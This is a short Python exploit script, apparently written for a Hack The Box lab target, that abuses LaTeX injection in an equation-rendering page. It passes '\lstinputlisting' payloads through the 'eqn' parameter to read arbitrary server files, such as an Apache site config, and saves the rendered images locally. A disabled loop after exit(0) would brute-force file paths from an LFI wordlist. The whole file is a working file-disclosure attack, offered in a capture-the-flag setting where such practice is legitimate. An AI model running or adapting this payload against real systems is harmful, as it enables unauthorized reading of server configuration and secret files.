import requests

SERVER = "http://latex.topology.htb"

def log(msg):
    print(f"[+] {msg}")

def info(msg):
    print(f"[*] {msg}" + 20*" ", end='\r')

def check_for_file(path):
    payload = "$\lstinputlisting{" + path + "}$"
    res = requests.get(f"{SERVER}/equation.php", params={"eqn": payload, "submit": "a"})
    if not res.content:
        return False
    local_name = path.replace("/", "_") + ".png"
    with open(local_name, "wb") as f:
        f.write(res.content)
    log(f"File {path} found, see {local_name}")

# read file open.txt line by line:

check_for_file("/etc/apache2/sites-enabled/000-default.conf")
exit(0)

size = open('LFI-WordList-Linux').read().count('\n')
with open('LFI-WordList-Linux') as f:
    for idx, line in enumerate(f):
        info(f"{idx}/{size} Checking {line.strip()}")
        check_for_file(line.strip())

